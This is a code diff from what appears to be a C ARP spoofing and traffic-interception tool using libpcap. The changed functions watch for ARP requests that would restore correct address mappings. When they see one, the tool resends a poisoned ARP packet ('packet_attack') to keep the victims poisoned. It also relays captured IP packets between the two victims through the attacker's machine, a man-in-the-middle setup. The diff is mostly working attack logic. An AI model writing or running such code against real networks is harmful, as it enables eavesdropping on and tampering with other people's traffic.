@@ -76,23 +76,19 @@ bool check(u_char * p, int len, struct in_addr ip, uint8_t * mac){
 	return 0;
 }
 
-bool check_mac(int type, uint8_t *mac1, uint8_t *mac2=0){
+bool check_mac(uint8_t *mac1, uint8_t *mac2=0){
 	int i;
-	if(type){
-		for(i=0;i<ETHER_ADDR_LEN;i++)if(*(mac1+i)!=0x00)return false;
+	if(mac2){
+		for(i=0;i<ETHER_ADDR_LEN;i++)if(*(mac1+i)!=*(mac2+i))return false;
 		return true;
 	}
 	else{
-		if(mac2){
-			for(i=0;i<ETHER_ADDR_LEN;i++)if(*(mac1+i)!=*(mac2+i))return false;
-			return true;
-		}
-		else{
-			for(i=0;i<ETHER_ADDR_LEN;i++)if(*(mac1+i)!=0xff)return false;
-			return true;
-		}
+		for(i=0;i<ETHER_ADDR_LEN;i++)if(*(mac1+i)!=0xff)return false;
+		return true;
 	}
+	
 }
+/*
 bool check_recover(u_char * p, int len, struct in_addr ip1, struct in_addr ip2, int type=0, uint8_t * mac=0){
 	int i;
 	struct arp_packet * a_ptr=(struct arp_packet *)p;
@@ -115,7 +111,23 @@ bool check_recover(u_char * p, int len, struct in_addr ip1, struct in_addr ip2, 
 	}
 	return false;
 }
-
+*/
+bool check_recover(u_char * p, int len, struct in_addr ip1, struct in_addr ip2, uint8_t * mac){
+	int i;
+	struct arp_packet * a_ptr=(struct arp_packet *)p;
+	if(ntohs(a_ptr->ethernet_part.ethernet_type)==ETHERTYPE_ARP){
+		if(ntohs(a_ptr->arp_part.opcode)==ARPOP_REQUEST){
+			if(ip1.s_addr==a_ptr->arp_part.sender_IP.s_addr){
+				if(check_mac(mac,a_ptr->ethernet_part.destination_address)&&(ip2.s_addr==a_ptr->arp_part.target_IP.s_addr))return true;
+			}
+			else if(ip2.s_addr==a_ptr->arp_part.sender_IP.s_addr){
+				if(check_mac(a_ptr->ethernet_part.destination_address))return true;
+				
+			}
+		}
+	}
+	return false;
+}
 bool relay(pcap_t * fp, u_char * p, int len, struct in_addr ip1, struct in_addr ip2, uint8_t * mac1, uint8_t *mac2, uint8_t *mac3){
 	int i;
 	u_char * new_p=(u_char*)malloc(sizeof(u_char)*len);
@@ -124,7 +136,7 @@ bool relay(pcap_t * fp, u_char * p, int len, struct in_addr ip1, struct in_addr 
 	struct ethernet * a_ptr=&a;
 	a_ptr=(struct ethernet *)p;
 	if(ntohs(a_ptr->ethernet_type)==ETHERTYPE_IP){
-		if(check_mac(0,a_ptr->source_address, mac1)&&check_mac(0,a_ptr->destination_address, mac2)){
+		if(check_mac(a_ptr->source_address, mac1)&&check_mac(a_ptr->destination_address, mac2)){
 			struct ip a;
 			struct ip * a_ptr=&a;
 			a_ptr=(struct ip *)(p+sizeof(struct ethernet));
@@ -144,7 +156,8 @@ bool relay(pcap_t * fp, u_char * p, int len, struct in_addr ip1, struct in_addr 
 				return true;
 			}
 		}
-		 else if(check_mac(0,a_ptr->source_address, mac3)&&check_mac(0,a_ptr->destination_address,mac2)){
+		
+		 else if(check_mac(a_ptr->source_address, mac3)&&check_mac(a_ptr->destination_address,mac2)){
 	         struct ip a;
 	         struct ip * a_ptr=&a;
 	         a_ptr=(struct ip *)(p+sizeof(struct ethernet));
@@ -164,6 +177,7 @@ bool relay(pcap_t * fp, u_char * p, int len, struct in_addr ip1, struct in_addr 
 	           	return true;
 	          }
       	}
+      	
    }
 	return false;
 }
@@ -341,41 +355,14 @@ while(1){
 		return 0;
 	}
 	
-	int j=0;
-	bool flag=false;
-	
 	for(i=0;i<n;i++){
-	  	if(check_recover((u_char *)p, header->caplen,send_ip[i],target_ip[i], 0, my_mac_address)){
-	  		while(j<5){
-	  			if(!pcap_sendpacket(fp, packet_attack[i], sizeof(arp_packet))){
-	  				flag=true;
-	  				break;
-	  			}
-	  			j++;
-	  		}
-	  	}
-	  	else if(check_recover((u_char *)p, header->caplen,target_ip[i],tmp)){
-	  		while(j<5){
-	  			if(!pcap_sendpacket(fp, packet_attack[i], sizeof(arp_packet))){
-	  				flag=true;
-	  				break;
-	  			}
-	  			j++;
-	  		}
-	  	}
-	  	else if(check_recover((u_char *)p, header->caplen,target_ip[i],tmp,1)){
-	  		while(j<5){
-	  			if(!pcap_sendpacket(fp, packet_attack[i], sizeof(arp_packet))){
-	  				flag=true;
-	  				break;
-	  			}
-	  			j++;
-	  		}
+	  	if(check_recover((u_char *)p, header->caplen,send_ip[i],target_ip[i], my_mac_address)){
+	  		pcap_sendpacket(fp, packet_attack[i], sizeof(arp_packet));
+	  		break;
 	  	}
 	  	else{
-  			if(relay(fp,(u_char *)p, header->caplen, send_ip[i], target_ip[i], send_mac_address[i], my_mac_address, target_mac_address[i]))flag=true;
+  			if(relay(fp,(u_char *)p, header->caplen, send_ip[i], target_ip[i], send_mac_address[i], my_mac_address, target_mac_address[i]))break;
   		}
-  		if(flag)break;
   	}
 }
 
